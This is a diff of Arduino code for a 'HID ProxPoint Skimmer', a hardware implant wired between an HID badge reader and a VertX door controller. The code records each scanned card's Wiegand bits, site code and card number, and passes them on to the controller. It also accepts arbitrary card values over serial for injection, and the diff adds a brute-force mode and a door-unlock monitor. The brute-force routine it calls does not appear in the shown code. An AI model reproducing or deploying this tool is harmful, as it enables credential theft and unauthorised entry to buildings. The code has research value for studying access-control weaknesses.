@@ -1,6 +1,5 @@
 /* HID ProxPoint Skimmer
 *  Brad Antoniewicz
-*  foundstone
 *
 * This is a prototype for a skimmer that sits between a
 * HID ProxPoint reader and a VertX Controller
@@ -15,6 +14,9 @@
 *        3 - ProxPoint White (DATA 1)
 *        8 - Output to VertX Data 0 (Green)
 *        9 - Output to VertX Data 1 (White)
+*        11 - VertX Strike Relay NO 1
+*        12 - VertX Strike Relay NO 2
+*        13 - LED
 *        5V - To ProxPoint Red
 *        GND - To ProxPoint Black
 *        GND - To VertX Ground (Black)
@@ -34,19 +36,22 @@
 */
 
 #define CARD_LEN 26
-unsigned int cardValArray[CARD_LEN] = {0} ;
-unsigned int InputCardValArray[CARD_LEN] = {7};
+#define LED 13   // output LED
+#define VX_D0 8  // output DATA0 (Green) to Controller
+#define VX_D1 9  // output DATA1 (White) to Controller
+#define VX_NO1 11 // input VertX Strike Relay NO 1
+#define VX_NO2 12 // input VertX Strike Relay NO 2
 
-int toVertX_D0 = 8; // output DATA0 (Green) to Controller
-int toVertX_D1 = 9; // output DATA1 (White) to Controller
+unsigned long cardValue = 0;
 
 int incomingByte = 0; 
 int sInputCount = 0;
 
 /*
 
-  This code is for processing data from the reader
-  */
+  This code is for processing data from the reader - Thanks Mike Cook!
+
+*/
 volatile unsigned long reader1 = 0;
 volatile int reader1Count = 0;
 
@@ -54,13 +59,11 @@ void reader1One(void) {
   reader1Count++;
   reader1 = reader1 << 1;
   reader1 |= 1;
-  //processInput(49);
 }
 
 void reader1Zero(void) {
   reader1Count++;
   reader1 = reader1 << 1;
-  //processInput(49);
 }
 
 void isr(int action) {
@@ -83,87 +86,73 @@ void resetState() {
   delay(10);
   Serial.flush();
   sInputCount=0;
-  for(short x=0; x<CARD_LEN; x++) {
-    cardValArray[x] = 9;
-  }
+  reader1 = 0;
+  reader1Count=0;
 }
 
-void writeCard(int inputmethod) {
-  
-  if ( inputmethod == 0 ) {
-    Serial.println("[-] Sending Manual Input:");
-    for (short x=0; x<CARD_LEN; x++) {
-      if ( cardValArray[x] == 1 ) {
+void writeCard(volatile unsigned long sendValue) {
+    Serial.println("[-] Sending Data:");
+    Serial.print("\t");
+    for (short x=CARD_LEN; x>=0; x--) {
+      if ( bitRead(sendValue,x) == 1 ) {
         Serial.print("1"); 
-        digitalWrite(toVertX_D1, LOW);
+        digitalWrite(VX_D1, LOW);
         delayMicroseconds(34);
-        digitalWrite(toVertX_D1, HIGH);
-      } else if ( cardValArray[x] == 0 ) {
+        digitalWrite(VX_D1, HIGH);
+      } else if ( bitRead(sendValue,x) == 0 ) {
         Serial.print("0");
-        digitalWrite(toVertX_D0, LOW);
+        digitalWrite(VX_D0, LOW);
         delayMicroseconds(34);
-        digitalWrite(toVertX_D0, HIGH);
+        digitalWrite(VX_D0, HIGH);
       }
       delay(2);
     }
     Serial.println();
-  } else if ( inputmethod == 1 ) {
-   Serial.println("[-] Sending Reader Input:");
-    for (short x=0; x<CARD_LEN; x++) {
-      if ( InputCardValArray[x] == 1 ) {
-        Serial.print("1"); 
-        digitalWrite(toVertX_D1, LOW);
-        delayMicroseconds(34);
-        digitalWrite(toVertX_D1, HIGH);
-      } else if ( InputCardValArray[x] == 0 ) {
-        Serial.print("0");
-        digitalWrite(toVertX_D0, LOW);
-        delayMicroseconds(34);
-        digitalWrite(toVertX_D0, HIGH);
-      }
-      delay(2);
-    }
-    Serial.println();
-    
-  } else {
-      Serial.println("[!] Not Sending Data - Something is wrong!");
-  }
-}
-void processReaderData() {
- for(short i=1; i<=CARD_LEN; i++) {
-   if (bitRead(reader1,i-1) == 0) {
-      InputCardValArray[CARD_LEN-i] = 0;
-   } else if (bitRead(reader1,i-1) == 1) {
-     InputCardValArray[CARD_LEN-i] = 1;
-   } else {
-       Serial.println("[!] Something odd happened when processing reader data!");
-   }
- }
 }
 
 void processInput(int byte) {
    if (byte == 49) { // DECIMAL 1 
-     cardValArray[sInputCount] = 1;
      sInputCount++; 
+     bitSet(cardValue, CARD_LEN - sInputCount);
   } else if (byte == 48) { // DECIMAL 0
-     cardValArray[sInputCount] = 0;
      sInputCount++; 
+     bitClear(cardValue, CARD_LEN - sInputCount);
+  } else if (byte == 98 || byte == 66) { // b or B
+      Serial.println("[-] Entering Brute Force Mode, provide starting value:");
+     doDecBrute();
   } else {
-      Serial.println("[!] Recieved invalid Value!");
+      Serial.print("[!] Recieved invalid Value:");
+      Serial.println(byte);
       resetState();
      }
 }
 
+void printCardData(unsigned long data) {
+    int serialNumber = (data >> 1) & 0x3fff;
+    int siteCode = (data >> 17) & 0x3ff;
+    Serial.print("\tH: ");
+    Serial.print(data,HEX);
+    Serial.print(" SC: ");
+    Serial.print(siteCode);
+    Serial.print(" C: ");
+    Serial.println(serialNumber);
+    Serial.print("\tB: ");
+    Serial.println(data, BIN);
+}
+
 void setup()
 {
-  Serial.begin(38400);
+  
    /* This stuff is for the Door Sensor LED */
-  pinMode(13, OUTPUT); 
-  pinMode(11, INPUT); // Reader 1
-  pinMode(12, INPUT); // Reader 2
+  pinMode(LED, OUTPUT); 
+  digitalWrite(LED, LOW); 
+  digitalWrite(LED, HIGH); 
+  pinMode(VX_NO1, INPUT); // Reader 1
+  pinMode(VX_NO2, INPUT); // Reader 2
   // End Door Sensor Stuff
   
   /* Reader In - */
+  isr(0);
   isr(1);
 
    for(int i = 2; i<4; i++){
@@ -179,15 +168,14 @@ void setup()
 
   //End Reader In
 
-  pinMode(toVertX_D0,OUTPUT);
-  digitalWrite(toVertX_D0, HIGH);
+  pinMode(VX_D0,OUTPUT);
+  digitalWrite(VX_D0, HIGH);
 
-  pinMode(toVertX_D1,OUTPUT);
-  digitalWrite(toVertX_D1, HIGH);
+  pinMode(VX_D1,OUTPUT);
+  digitalWrite(VX_D1, HIGH);
   
   sInputCount = 0; 
- 
-  
+  Serial.begin(38400);
   Serial.println("Please provide a tag value");
   Serial.println("For Binary input, it must be 26 bits long");
   Serial.println("No parity needs, just add two 0's to the beginning");
@@ -197,30 +185,26 @@ void setup()
 void loop() {
   
   /* This stuff is for the Door Sensor LED */
-  int reader1Status = digitalRead(11);
-  int reader2Status = digitalRead(12);
+  int reader1Status = digitalRead(VX_NO1);
+  int reader2Status = digitalRead(VX_NO2);
   if ( reader1Status == HIGH || reader2Status == HIGH ) {
-    digitalWrite(13, HIGH);
-    delay(1000);
-    digitalWrite(13, LOW);
-   }else {
-    digitalWrite(13, LOW); 
-   }
-
+    Serial.println("---  D o o r  U n l o c k e d ---");
+    digitalWrite(LED, LOW);
+    delay(4000);
+    digitalWrite(LED, HIGH);
+   } 
   // End Door Sensor Stuff
   
-
+/* Start Serial In
+  
+    All this stuff does is accept input via the serial interface
+*/
   if (Serial.available() > 0 ) {
     
     incomingByte = Serial.read();
     Serial.print(".");
     delay(10);
-    /* Serial.print(sInputCount);
-    Serial.print(":");
-    Serial.print(incomingByte, DEC);
-    Serial.print(" ");
-    */
-    
+
     processInput(incomingByte);
     if ( ( sInputCount > 0 ) && ( sInputCount != CARD_LEN ) && ( Serial.peek() == -1 ) ) {
           Serial.println("\n[!] Invalid Input Length!");
@@ -229,56 +213,33 @@ void loop() {
      }
   if (sInputCount == CARD_LEN) {
       Serial.println("");
-          Serial.println("[-] Sending current Buffer");
-          /* for(short x=0; x<CARD_LEN; x++) {
-            Serial.print(" ");
-            Serial.print(x);
-            Serial.print("-");
-            Serial.print(cardValArray[x]);
-          }
-          Serial.println("");
-          */
-
-          writeCard(0); 
+          Serial.println("[-] Sending current Serial Buffer");
+          writeCard(cardValue); 
           resetState();
-
-
      } else if (sInputCount > CARD_LEN) {
           Serial.println("[!] Sorry, looks like your input was too long.. ");
           resetState();
-
       }
-       /* Reader IN */
+      
+// End Serial In
+
+/* Start Reader IN
+    
+     All this stuff does is take data in from the reader
+     then send it to the controller
+*/
        
 if(reader1Count >= 26){
     Serial.println("");
     Serial.println("[+] Recieved input from Reader:");
     Serial.println("-------------------------------");
-    Serial.print("R1: ");
-    Serial.print(reader1,HEX);
-    Serial.print(" SC:");
-    int serialNumber=(reader1 >> 1) & 0x3fff;
-    int siteCode= (reader1 >> 17) & 0x3ff;
+    printCardData(reader1);
 
-    Serial.print(siteCode);
-    Serial.print(" C: ");
-    Serial.println(serialNumber);
-    Serial.println(reader1,BIN);
-    processReaderData();
-    /* Serial.println("From Array:");
-   for(short x=0; x<CARD_LEN; x++) {
-      Serial.print(InputCardValArray[x]);
-     }
-     Serial.println("");
-     */
     Serial.println("[+] Sending input to Controller:");
-     writeCard(1);
+    writeCard(reader1);
+    resetState();
     Serial.println("-------------------------------");
- 
-    reader1 = 0;
-    reader1Count = 0;
-    sInputCount = 0;
-}
+    }
    // END Reader IN
 }
 
